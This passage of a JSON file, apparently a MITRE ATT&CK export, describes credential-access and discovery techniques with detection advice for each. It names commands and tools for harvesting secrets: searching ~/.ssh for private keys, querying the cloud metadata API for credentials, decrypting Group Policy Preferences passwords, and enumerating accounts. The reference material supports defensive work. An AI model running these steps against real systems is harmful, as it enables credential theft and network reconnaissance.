        "description": " \nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.  \nCommon key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \nAdversaries may also look in common key directories, such as  ~/.ssh for SSH keys on * nix-based systems or  C:\\Users\\(username)\\.ssh\\ on Windows. These private keys can be used to authenticate to  Remote Services like SSH or for use in decrypting other collected files such as email. \nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.  \n \n\nSome private keys require a password or passphrase for operation, so an adversary may also use  Input Capture for keylogging or attempt to  Brute Force the passphrase off-line.  ",
        "detection": "\nMonitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.\n\n"
      },
      "T1552.005": {
        "name": "Cloud Instance Metadata API",
        "description": " \nAdversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. \nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.  \nA cloud metadata API has been used in at least one high profile compromise.  \n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.  \n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at  http[:]//169.254.169.254 .  ",
        "detection": "\nMonitor access to the Instance Metadata API and look for anomalous queries.It may be possible to detect adversary use of credentials they have obtained. See Valid Accounts for more information.\n\n"
      },
      "T1552.006": {
        "name": "Group Policy Preferences",
        "description": " \nAdversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.  \n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).  \n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files: Metasploit’s post exploitation module:  post/windows/gather/credentials/gpp Get-GPPPassword  \ngpprefdecrypt.py \nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files:  dir /s * .xml  ",
        "detection": "\nMonitor for attempts to access SYSVOL that involve searching for XML files. Deploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors. \n\n"
      }
    }
  },
  "TA0007": {
    "name": "Discovery",
    "description": "\nThe adversary is trying to figure out your environment.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. \n",
    "technique": {
      "T1087": {
        "name": "Account Discovery",
        "description": " \nAdversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1087.001": {
        "name": "Local Account",
        "description": " \nAdversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior. \nCommands such as  net user and  net localgroup of the  Net utility and  id and  groups on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the  /etc/passwd file.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1087.002": {
        "name": "Domain Account",
        "description": " \nAdversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior. \nCommands such as  net user /domain and  net group /domain of the  Net utility,  dscacheutil -q group on macOS, and  ldapsearch on Linux can list domain users and groups.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1087.003": {
        "name": "Email Account",
        "description": " \nAdversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).  \n\nIn on-premises Exchange and Exchange Online, the  Get-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.  \n \n ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1087.004": {
        "name": "Cloud Account",
        "description": " \nAdversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. \nWith authenticated access there are several tools that can be used to find accounts. The  Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.  \n \nThe Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command  az ad user list will list all users within a domain.  \n \n \nThe AWS command  aws iam list-users may be used to obtain a list of users in the current account while  aws iam list-roles can obtain IAM roles that have a specified path prefix.  \n \nIn GCP,  gcloud iam service-accounts list and  gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.  \n ",
        "detection": "\nMonitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\n"
      },
      "T1010": {
        "name": "Application Window Discovery",
        "description": " \nAdversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1217": {
        "name": "Browser Bookmark Discovery",
        "description": " \nAdversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. \nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially  Credentials In Files associated with logins cached by a browser. \nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as Windows Management Instrumentation and PowerShell.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\n"
      },
      "T1580": {
        "name": "Cloud Infrastructure Discovery",
        "description": " \nAn adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services. \nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a  DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, as well as the  ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request.  \n \nSimilarly, GCP's Cloud SDK CLI provides the  gcloud compute instances list command to list all Google Compute Engine instances in a project  \n, and Azure's CLI command  az vm list lists details of virtual machines.  \n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.  \nThe discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.  \nUnlike in  Cloud Service Discovery , this technique focuses on the discovery of components of the provided services rather than the services themselves.  ",
        "detection": "\nEstablish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.\n\n"
      },
      "T1538": {
        "name": "Cloud Service Dashboard",
        "description": " \nAn adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.  \n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.  ",
        "detection": "\nMonitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console. \n\n"
      },
      "T1526": {
        "name": "Cloud Service Discovery",
        "description": " \nAn adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. \nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.  \n \n\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.  \n \n ",
        "detection": "\nCloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.\n\n"
      },
      "T1482": {
        "name": "Domain Trust Discovery",
        "description": " \nAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.  \nDomain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct  SID-History Injection ,  Pass the Ticket , and  Kerberoasting .  \n \nDomain trusts can be enumerated using the  DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.  \nThe Windows utility  Nltest is known to be used by adversaries to enumerate domain trusts.  \n ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information, such as nltest /domain_trusts. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the DSEnumerateDomainTrusts() Win32 API call to spot activity associated with Domain Trust Discovery.  Information may also be acquired through Windows system management tools such as PowerShell. The .NET method GetAllTrustRelationships() can be an indicator of Domain Trust Discovery. \n\n"
      },
      "T1083": {
        "name": "File and Directory Discovery",
        "description": " \nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from  File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nMany command shell utilities can be used to obtain this information. Examples include  dir ,  tree ,  ls ,  find , and  locate .  \nCustom tools may also be used to gather file and directory information and interact with the  Native API .  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1046": {
        "name": "Network Service Scanning",
        "description": " \nAdversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.\n\n"
      },
      "T1135": {
        "name": "Network Share Discovery",
        "description": " \nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \nFile sharing over a Windows network occurs over the SMB protocol.  \n  \n  Net can be used to query a remote system for available shared drives using the  net view \\remotesystem command. It can also be used to query shared drives on the local system using  net share .  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1040": {
        "name": "Network Sniffing",
        "description": " \nAdversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. \nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as  LLMNR/NBT-NS Poisoning and SMB Relay , can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary. \nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.  ",
        "detection": "\nDetecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\n"
      },
      "T1201": {
        "name": "Password Policy Discovery",
        "description": " \nAdversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through  Brute Force . This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts). \nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as  net accounts (/domain) ,  Get-ADDefaultDomainPasswordPolicy ,  chage -l ,  cat /etc/pam.d/common-password , and  pwpolicy getaccountpolicies .  \n  \n ",
        "detection": "\nMonitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.\n\n"
      },
      "T1120": {
        "name": "Peripheral Device Discovery",
        "description": " \nAdversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1069": {
        "name": "Permission Groups Discovery",
        "description": " \nAdversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1069.001": {
        "name": "Local Groups",
        "description": " \nAdversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. \nCommands such as  net localgroup of the  Net utility,  dscl . -list /Groups on macOS, and  groups on Linux can list local groups.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1069.002": {
        "name": "Domain Groups",
        "description": " \nAdversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. \nCommands such as  net group /domain of the  Net utility,  dscacheutil -q group on macOS, and  ldapsearch on Linux can list domain-level groups.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1069.003": {
        "name": "Cloud Groups",
        "description": " \nAdversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group. \nWith authenticated access there are several tools that can be used to find permissions groups. The  Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.  \n \n\nAzure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command  az ad user get-member-groups will list groups associated to a user account.  \n \n ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.\n\n"
      },
      "T1057": {
        "name": "Process Discovery",
        "description": " \nAdversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from  Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nIn Windows environments, adversaries could obtain details on running processes using the  Tasklist utility via  cmd or  Get-Process via  PowerShell . Information about processes can also be extracted from the output of  Native API calls such as  CreateToolhelp32Snapshot . In Mac and Linux, this is accomplished with the  ps command. Adversaries may also opt to enumerate processes via /proc.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1012": {
        "name": "Query Registry",
        "description": " \nAdversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software. \nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.  \nInformation can easily be queried using the  Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from  Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Interaction with the Windows Registry may come from the command line using utilities such as Reg or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1018": {
        "name": "Remote System Discovery",
        "description": " \nAdversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or  net view using  Net . Adversaries may also use local host files (ex:  C:\\Windows\\System32\\Drivers\\etc\\hosts or  /etc/hosts ) in order to discover the hostname to IP address mappings of remote systems. \nSpecific to macOS, the  bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1518": {
        "name": "Software Discovery",
        "description": " \nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from  Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to  Exploitation for Privilege Escalation .  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1518.001": {
        "name": "Security Software Discovery",
        "description": " \nAdversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from  Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nExample commands that can be used to obtain security software information are  netsh ,  reg query with  Reg ,  dir with  cmd , and  Tasklist , but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software. \nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.  \n ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.In cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.\n\n"
      },
      "T1082": {
        "name": "System Information Discovery",
        "description": " \nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from  System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nTools such as  Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS  systemsetup command, but it requires administrative privileges. \nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.  \n \n \n ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.\n\n"
      },
      "T1016": {
        "name": "System Network Configuration Discovery",
        "description": " \nAdversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include  Arp ,  ipconfig /  ifconfig ,  nbtstat , and  route . \nAdversaries may use the information from  System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1049": {
        "name": "System Network Connections Discovery",
        "description": " \nAdversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.  \n \n \n\nUtilities and commands that acquire this information include  netstat , \"net use,\" and \"net session\" with  Net . In Mac and Linux,  netstat and  lsof can be used to list current connections.  who -a and  w can be used to show which users are currently logged in, similar to \"net session\".  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1033": {
        "name": "System Owner/User Discovery",
        "description": " \nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using  OS Credential Dumping . The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from  System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \nUtilities and commands that acquire this information include  whoami . In Mac and Linux, the currently logged in user can be identified with  w and  who .  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1007": {
        "name": "System Service Discovery",
        "description": " \nAdversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using  Tasklist , and \"net start\" using  Net , but adversaries may also use other tools as well. Adversaries may use the information from  System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  ",
        "detection": "\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1124": {
        "name": "System Time Discovery",
